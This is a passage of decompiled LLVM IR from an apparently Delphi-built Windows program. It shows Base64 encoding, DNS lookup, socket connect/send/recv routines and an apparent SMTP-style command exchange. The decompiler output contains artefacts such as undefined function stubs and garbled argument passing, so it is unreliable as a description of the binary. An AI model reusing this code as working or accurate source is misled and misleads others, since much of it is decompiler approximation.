  %68 = udiv i32 %62, 256, !insn.addr !763
  %69 = trunc i32 %68 to i8, !insn.addr !763
  %70 = add i8 %67, %69, !insn.addr !763
  store i8 %70, i8* %66, align 4, !insn.addr !763
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !764
  %71 = call i32 @"@LStrClr"(), !insn.addr !765
  %72 = call i32 @function_4034c8(), !insn.addr !766
  %73 = add i32 %60, -8, !insn.addr !767
  %74 = inttoptr i32 %73 to i32*, !insn.addr !767
  store i32 %72, i32* %74, align 4, !insn.addr !767
  %75 = ashr i32 %72, 31, !insn.addr !768
  %76 = zext i32 %72 to i64, !insn.addr !769
  %77 = zext i32 %75 to i64, !insn.addr !769
  %78 = mul i64 %77, 4294967296, !insn.addr !769
  %79 = or i64 %78, %76, !insn.addr !769
  %80 = sdiv i64 %79, 3, !insn.addr !769
  %81 = trunc i64 %80 to i32, !insn.addr !769
  store i32 %81, i32* %eax, align 4, !insn.addr !769
  %82 = srem i64 %79, 3, !insn.addr !769
  %83 = trunc i64 %82 to i32, !insn.addr !769
  %84 = icmp eq i32 %83, 0, !insn.addr !770
  %85 = icmp eq i1 %84, false, !insn.addr !771
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !771

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !772
  %87 = ashr i32 %86, 31, !insn.addr !773
  %88 = zext i32 %86 to i64, !insn.addr !774
  %89 = zext i32 %87 to i64, !insn.addr !774
  %90 = mul i64 %89, 4294967296, !insn.addr !774
  %91 = or i64 %90, %88, !insn.addr !774
  %92 = sdiv i64 %91, 3, !insn.addr !774
  %93 = trunc i64 %92 to i32, !insn.addr !774
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !775
  br label %dec_label_pc_405430, !insn.addr !775

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !775

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !776
  ret i32 %94, !insn.addr !776

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !777
  %96 = zext i32 %95 to i64, !insn.addr !777
  %97 = zext i32 %arg3 to i64, !insn.addr !777
  %98 = mul i64 %97, 4294967296, !insn.addr !777
  %99 = or i64 %98, %96, !insn.addr !777
  %100 = zext i32 %arg2 to i64, !insn.addr !777
  %101 = sdiv i64 %99, %100, !insn.addr !777
  %102 = trunc i64 %101 to i32, !insn.addr !777
  %103 = add i32 %102, 1, !insn.addr !778
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !778
  br label %dec_label_pc_405430, !insn.addr !778

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !779
  ret i32 %104, !insn.addr !780

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !781
  %106 = load i32, i32* %105, align 4, !insn.addr !781
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !781
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !782
  %109 = load i32, i32* %108, align 4, !insn.addr !782
  %110 = add i32 %109, %107, !insn.addr !782
  store i32 %110, i32* %108, align 4, !insn.addr !782
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !783
  %113 = inttoptr i32 %112 to i8*, !insn.addr !783
  %114 = load i8, i8* %113, align 1, !insn.addr !783
  %115 = trunc i32 %111 to i8, !insn.addr !783
  %116 = add i8 %114, %115, !insn.addr !783
  store i8 %116, i8* %113, align 1, !insn.addr !783
  %117 = load i32, i32* %eax, align 4, !insn.addr !784
  ret i32 %117, !insn.addr !784
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !785
  %esp.0.reg2mem = alloca i32, !insn.addr !785
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !786
  %3 = inttoptr i32 %2 to i32*, !insn.addr !786
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !787
  %13 = inttoptr i32 %12 to i32*, !insn.addr !787
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !785
  br label %dec_label_pc_40543e, !insn.addr !785

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !788
  %25 = add i32 %24, 3, !insn.addr !789
  %26 = load i32, i32* %3, align 4, !insn.addr !786
  %27 = icmp sgt i32 %25, %26, !insn.addr !790
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !790

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !791
  %29 = inttoptr i32 %28 to i8*, !insn.addr !791
  %30 = load i8, i8* %29, align 1, !insn.addr !791
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !792
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !793
  %34 = inttoptr i32 %33 to i8*, !insn.addr !793
  %35 = load i8, i8* %34, align 1, !insn.addr !793
  store i8 %35, i8* %5, align 1, !insn.addr !794
  %36 = load i8, i8* %29, align 1, !insn.addr !795
  %37 = mul i8 %36, 16, !insn.addr !796
  %38 = and i8 %37, 48, !insn.addr !797
  %39 = add i32 %28, 1, !insn.addr !798
  %40 = inttoptr i32 %39 to i8*, !insn.addr !798
  %41 = load i8, i8* %40, align 1, !insn.addr !798
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !799
  %44 = zext i8 %43 to i32, !insn.addr !799
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !800
  %46 = inttoptr i32 %45 to i8*, !insn.addr !800
  %47 = load i8, i8* %46, align 1, !insn.addr !800
  store i8 %47, i8* %7, align 1, !insn.addr !801
  %48 = load i8, i8* %40, align 1, !insn.addr !802
  %49 = mul i8 %48, 4, !insn.addr !803
  %50 = and i8 %49, 60, !insn.addr !804
  %51 = add i32 %28, 2, !insn.addr !805
  %52 = inttoptr i32 %51 to i8*, !insn.addr !805
  %53 = load i8, i8* %52, align 1, !insn.addr !805
  %54 = udiv i8 %53, 64, !insn.addr !806
  %55 = or i8 %54, %50, !insn.addr !807
  %56 = zext i8 %55 to i32, !insn.addr !807
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !808
  %58 = inttoptr i32 %57 to i8*, !insn.addr !808
  %59 = load i8, i8* %58, align 1, !insn.addr !808
  store i8 %59, i8* %9, align 1, !insn.addr !809
  %60 = and i8 %53, 63, !insn.addr !810
  %61 = zext i8 %60 to i32, !insn.addr !810
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !811
  %63 = inttoptr i32 %62 to i8*, !insn.addr !811
  %64 = load i8, i8* %63, align 1, !insn.addr !811
  store i8 %64, i8* %11, align 1, !insn.addr !812
  br label %dec_label_pc_405589, !insn.addr !813

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !814
  %66 = icmp sgt i32 %65, %26, !insn.addr !815
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !815

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !816
  %77 = and i8 %76, 48, !insn.addr !817
  %78 = add i32 %67, 1, !insn.addr !818
  %79 = inttoptr i32 %78 to i8*, !insn.addr !818
  %80 = load i8, i8* %79, align 1, !insn.addr !818
  %81 = zext i8 %80 to i32, !insn.addr !818
  %82 = udiv i8 %80, 16, !insn.addr !819
  %83 = or i8 %82, %77, !insn.addr !820
  %84 = zext i8 %83 to i32, !insn.addr !820
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !821
  %86 = inttoptr i32 %85 to i8*, !insn.addr !821
  %87 = load i8, i8* %86, align 1, !insn.addr !821
  store i8 %87, i8* %7, align 1, !insn.addr !822
  %88 = mul i32 %81, 4, !insn.addr !823
  %89 = and i32 %88, 60, !insn.addr !824
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !825
  %91 = inttoptr i32 %90 to i8*, !insn.addr !825
  %92 = load i8, i8* %91, align 4, !insn.addr !825
  store i8 %92, i8* %9, align 1, !insn.addr !826
  store i8 61, i8* %11, align 1, !insn.addr !827
  br label %dec_label_pc_405589, !insn.addr !828

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !829
  %94 = mul i32 %93, 16, !insn.addr !830
  %95 = and i32 %94, 48, !insn.addr !831
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !832
  %97 = inttoptr i32 %96 to i8*, !insn.addr !832
  %98 = load i8, i8* %97, align 16, !insn.addr !832
  store i8 %98, i8* %7, align 1, !insn.addr !833
  store i8 61, i8* %9, align 1, !insn.addr !834
  store i8 61, i8* %11, align 1, !insn.addr !835
  br label %dec_label_pc_405589, !insn.addr !835

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !787
  %100 = inttoptr i32 %99 to i32*, !insn.addr !836
  %101 = load i32, i32* %100, align 4, !insn.addr !836
  %102 = add i32 %esp.0.reload, -4, !insn.addr !836
  %103 = inttoptr i32 %102 to i32*, !insn.addr !836
  store i32 %101, i32* %103, align 4, !insn.addr !836
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !837
  %105 = load i32, i32* %15, align 4, !insn.addr !838
  %106 = add i32 %esp.0.reload, -8, !insn.addr !838
  %107 = inttoptr i32 %106 to i32*, !insn.addr !838
  store i32 %105, i32* %107, align 4, !insn.addr !838
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !839
  %109 = load i32, i32* %17, align 4, !insn.addr !840
  %110 = add i32 %esp.0.reload, -12, !insn.addr !840
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !840
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !841
  %113 = load i32, i32* %19, align 4, !insn.addr !842
  %114 = add i32 %esp.0.reload, -16, !insn.addr !842
  %115 = inttoptr i32 %114 to i32*, !insn.addr !842
  store i32 %113, i32* %115, align 4, !insn.addr !842
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !843
  %117 = load i32, i32* %21, align 4, !insn.addr !844
  %118 = add i32 %esp.0.reload, -20, !insn.addr !844
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !844
  %120 = call i32 @"@LStrCatN"(), !insn.addr !845
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !846
  %122 = load i32, i32* %23, align 4, !insn.addr !847
  %123 = add i32 %122, -1, !insn.addr !847
  %124 = icmp eq i32 %123, 0, !insn.addr !847
  store i32 %123, i32* %23, align 4, !insn.addr !847
  %125 = icmp eq i1 %124, false, !insn.addr !848
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !848
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !848
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !848

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !849
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !850
  store i32 4216319, i32* %111, align 4, !insn.addr !851
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !852
  ret i32 %127, !insn.addr !853
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !854
  ret i32 %0, !insn.addr !854
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !855
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !856
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !857
  %0 = call i32 @function_4036c8(), !insn.addr !858
  %1 = inttoptr i32 %0 to i8*, !insn.addr !859
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !860
  %3 = call i32 @"@FillChar"(), !insn.addr !861
  %4 = icmp eq %hostent* %2, null, !insn.addr !862
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !863

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !860
  %6 = add i32 %5, 12, !insn.addr !864
  %7 = inttoptr i32 %6 to i32*, !insn.addr !864
  %8 = load i32, i32* %7, align 4, !insn.addr !864
  %9 = inttoptr i32 %8 to i32*, !insn.addr !865
  %10 = load i32, i32* %9, align 4, !insn.addr !865
  %11 = inttoptr i32 %10 to i8*, !insn.addr !866
  %12 = load i8, i8* %11, align 1, !insn.addr !866
  %13 = sext i8 %12 to i32, !insn.addr !867
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !868
  br label %dec_label_pc_405653, !insn.addr !868

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !869
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !870
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !871
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !872
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !872
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !872
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !873
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !874
  %5 = trunc i32 %4 to i16, !insn.addr !874
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !875
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !876
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !876
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !877
  %9 = icmp eq i32 %8, -1, !insn.addr !878
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !879
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !879

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !880
  %11 = trunc i32 %10 to i16, !insn.addr !881
  %12 = call i16 @htons(i16 %11), !insn.addr !881
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !882
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !882
  %14 = sext i16 %12 to i32, !insn.addr !883
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !883
  %16 = icmp eq i32 %15, 0, !insn.addr !884
  %17 = icmp eq i1 %16, false, !insn.addr !885
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !885
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !885

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !886
  store i32 %8, i32* %18, align 4, !insn.addr !886
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !887
  br label %dec_label_pc_4056f2, !insn.addr !887

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !888
  %20 = load i32, i32* %19, align 4, !insn.addr !888
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !889
  %21 = add i32 %esp.0.reload, 8, !insn.addr !890
  %22 = inttoptr i32 %21 to i32*, !insn.addr !890
  store i32 4216591, i32* %22, align 4, !insn.addr !890
  %23 = call i32 @"@LStrClr"(), !insn.addr !891
  ret i32 %23, !insn.addr !892
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !893
  ret i32 %0, !insn.addr !893
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !894
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !895
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !896
  %2 = call i32 @WSACleanup(), !insn.addr !897
  ret i32 %2, !insn.addr !898
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !899
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !900
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !900
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !900
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !901
  %4 = call i32 @function_4036c8(), !insn.addr !902
  %5 = call i32 @StrCopy(), !insn.addr !903
  %6 = call i32 @function_406fcc(i32 4), !insn.addr !904
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !905
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !906
  %9 = call i32 @"@LStrClr"(), !insn.addr !907
  ret i32 %9, !insn.addr !908
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !909
  ret i32 %0, !insn.addr !909
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !910
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !911
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !912
  %2 = call i32 @StrPas(), !insn.addr !913
  ret i32 %2, !insn.addr !914
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !915
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !915
  %esp.0.reg2mem = alloca i32, !insn.addr !915
  %ecx.0.reg2mem = alloca i32, !insn.addr !915
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !916
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !917
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !917
  br label %dec_label_pc_4057d9, !insn.addr !917

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !918
  %2 = inttoptr i32 %1 to i32*, !insn.addr !918
  store i32 0, i32* %2, align 4, !insn.addr !918
  %3 = add i32 %esp.0.reload, -8, !insn.addr !919
  %4 = inttoptr i32 %3 to i32*, !insn.addr !919
  store i32 0, i32* %4, align 4, !insn.addr !919
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !920
  %6 = icmp eq i32 %5, 0, !insn.addr !920
  %7 = icmp eq i1 %6, false, !insn.addr !921
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !921
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !921
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !921

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !922
  %9 = inttoptr i32 %8 to i32*, !insn.addr !922
  store i32 0, i32* %9, align 4, !insn.addr !922
  %10 = call i32 @function_4036b8(), !insn.addr !923
  %11 = call i32 @function_4036b8(), !insn.addr !924
  %12 = call i32 @function_4036b8(), !insn.addr !925
  %13 = call i32 @function_4036b8(), !insn.addr !926
  %14 = call i32 @function_4036b8(), !insn.addr !927
  %15 = call i32 @function_4036b8(), !insn.addr !928
  %16 = call i32 @function_4036b8(), !insn.addr !929
  %17 = add i32 %esp.0.reload, -20, !insn.addr !930
  %18 = inttoptr i32 %17 to i32*, !insn.addr !930
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !930
  store i32 %19, i32* %18, align 4, !insn.addr !930
  %20 = add i32 %esp.0.reload, -24, !insn.addr !931
  %21 = inttoptr i32 %20 to i32*, !insn.addr !931
  store i32 4217413, i32* %21, align 4, !insn.addr !931
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !932
  %23 = add i32 %esp.0.reload, -28, !insn.addr !932
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !932
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !933
  %25 = call i32 @function_405664(), !insn.addr !934
  %26 = icmp eq i32 %25, 0, !insn.addr !935
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !936
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !936
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !936

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !937
  %28 = inttoptr i32 %27 to i32*, !insn.addr !937
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !937
  %29 = add i32 %esp.0.reload, -36, !insn.addr !938
  %30 = inttoptr i32 %29 to i32*, !insn.addr !938
  %31 = add i32 %esp.0.reload, -40, !insn.addr !939
  %32 = inttoptr i32 %31 to i32*, !insn.addr !939
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !939
  %33 = call i32 @"@LStrCatN"(), !insn.addr !940
  %34 = call i32 @function_405724(), !insn.addr !941
  %35 = call i32 @function_4057a4(), !insn.addr !942
  %36 = call i32 @function_405724(), !insn.addr !943
  %37 = call i32 @function_4057a4(), !insn.addr !944
  %38 = call i32 @"@LStrCat"(), !insn.addr !945
  %39 = call i32 @function_405724(), !insn.addr !946
  %40 = call i32 @function_4057a4(), !insn.addr !947
  %41 = call i32 @"@LStrCat"(), !insn.addr !948
  %42 = call i32 @function_405724(), !insn.addr !949
  %43 = call i32 @function_4057a4(), !insn.addr !950
  %44 = add i32 %esp.0.reload, -44, !insn.addr !951
  %45 = inttoptr i32 %44 to i32*, !insn.addr !951
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !951
  %46 = add i32 %esp.0.reload, -48, !insn.addr !952
  %47 = inttoptr i32 %46 to i32*, !insn.addr !952
  store i32 %arg1, i32* %47, align 4, !insn.addr !952
  %48 = add i32 %esp.0.reload, -52, !insn.addr !953
  %49 = inttoptr i32 %48 to i32*, !insn.addr !953
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !953
  %50 = add i32 %esp.0.reload, -56, !insn.addr !954
  %51 = inttoptr i32 %50 to i32*, !insn.addr !954
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !954
  %52 = call i32 @"@LStrCatN"(), !insn.addr !955
  %53 = call i32 @function_405724(), !insn.addr !956
  %54 = call i32 @function_4057a4(), !insn.addr !957
  %55 = add i32 %esp.0.reload, -60, !insn.addr !958
  %56 = inttoptr i32 %55 to i32*, !insn.addr !958
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !958
  %57 = add i32 %esp.0.reload, -64, !insn.addr !959
  %58 = inttoptr i32 %57 to i32*, !insn.addr !959
  store i32 %arg2, i32* %58, align 4, !insn.addr !959
  %59 = add i32 %esp.0.reload, -68, !insn.addr !960
  %60 = inttoptr i32 %59 to i32*, !insn.addr !960
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !960
  %61 = add i32 %esp.0.reload, -72, !insn.addr !961
  %62 = inttoptr i32 %61 to i32*, !insn.addr !961
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !961
  %63 = call i32 @"@LStrCatN"(), !insn.addr !962
  %64 = call i32 @function_405724(), !insn.addr !963
  %65 = call i32 @function_4057a4(), !insn.addr !964
  %66 = call i32 @function_405724(), !insn.addr !965
  %67 = call i32 @function_4057a4(), !insn.addr !966
  %68 = add i32 %esp.0.reload, -76, !insn.addr !967
  %69 = inttoptr i32 %68 to i32*, !insn.addr !967
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !967
  %70 = add i32 %esp.0.reload, -80, !insn.addr !968
  %71 = inttoptr i32 %70 to i32*, !insn.addr !968
  store i32 %arg1, i32* %71, align 4, !insn.addr !968
  %72 = add i32 %esp.0.reload, -84, !insn.addr !969
  %73 = inttoptr i32 %72 to i32*, !insn.addr !969
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !969
  %74 = add i32 %esp.0.reload, -88, !insn.addr !970
  %75 = inttoptr i32 %74 to i32*, !insn.addr !970
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !970
  %76 = add i32 %esp.0.reload, -92, !insn.addr !971
  %77 = inttoptr i32 %76 to i32*, !insn.addr !971
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !971
  %78 = add i32 %esp.0.reload, -96, !insn.addr !972
  %79 = inttoptr i32 %78 to i32*, !insn.addr !972
  store i32 %arg2, i32* %79, align 4, !insn.addr !972
  %80 = add i32 %esp.0.reload, -100, !insn.addr !973
  %81 = inttoptr i32 %80 to i32*, !insn.addr !973
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !973
  %82 = add i32 %esp.0.reload, -104, !insn.addr !974
  %83 = inttoptr i32 %82 to i32*, !insn.addr !974
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !974
  %84 = add i32 %esp.0.reload, -108, !insn.addr !975
  %85 = inttoptr i32 %84 to i32*, !insn.addr !975
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !975
  %86 = add i32 %esp.0.reload, -112, !insn.addr !976
  %87 = inttoptr i32 %86 to i32*, !insn.addr !976
  store i32 %arg3, i32* %87, align 4, !insn.addr !976
